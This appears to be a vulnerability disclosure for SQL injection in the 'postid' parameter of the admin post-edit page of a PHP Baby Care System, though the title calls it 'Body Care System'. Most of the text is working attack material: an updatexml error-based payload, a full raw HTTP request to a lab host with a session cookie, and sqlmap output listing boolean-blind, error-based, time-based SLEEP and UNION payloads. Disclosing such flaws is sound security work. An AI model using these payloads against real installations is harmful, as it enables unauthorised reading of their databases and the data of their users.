## Body Care System has SQL injection vulnerability

vendor: https://www.sourcecodester.com/php/14622/baby-care-system-phpmysqli-full-source-code.html

Vulnerability file: /BabyCare/admin/posts.php&action=edit

![image](https://user-images.githubusercontent.com/54017627/160948031-f08a0251-097a-4c0f-8952-095124bba78d.png)

Vulnerability location: /BabyCare/admin.php?id=posts&action=edit&postid=2 //postid is Injection point

[+]Payload: /BabyCare/admin.php?id=posts&action=edit&postid=2%27%20and%20updatexml(1,concat(0x7e,(select%20database()),0x7e),2)--+ //postid is Injection point

```sql
GET /BabyCare/admin.php?id=posts&action=edit&postid=2%27%20and%20updatexml(1,concat(0x7e,(select%20database()),0x7e),2)--+ HTTP/1.1
Host: 192.168.1.19
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=7r2orfo1e9b49mg28f5ke9bdjv
Connection: close
```
![image](https://user-images.githubusercontent.com/54017627/160947897-0af19bc1-58e2-418d-a21c-122416bddbd8.png)

```sql
---
Parameter: postid (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=posts&action=edit&postid=2' AND 7502=7502 AND 'Yurq'='Yurq

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=posts&action=edit&postid=2' AND (SELECT 6867 FROM(SELECT COUNT(*),CONCAT(0x7162786a71,(SELECT (ELT(6867=6867,1))),0x7170767071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'huoz'='huoz

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=posts&action=edit&postid=2' AND (SELECT 5804 FROM (SELECT(SLEEP(5)))ZBUN) AND 'nxGO'='nxGO

    Type: UNION query
    Title: Generic UNION query (NULL) - 8 columns
    Payload: id=posts&action=edit&postid=-9180' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7162786a71,0x4e436b74735063624a4164484d4f675676736e68467951525141677146614f56476b524f66456f50,0x7170767071),NULL,NULL,NULL,NULL-- -
---
```

![image](https://user-images.githubusercontent.com/54017627/160947861-be4e9a03-ce22-4e52-a60e-b13cb6feebd4.png)
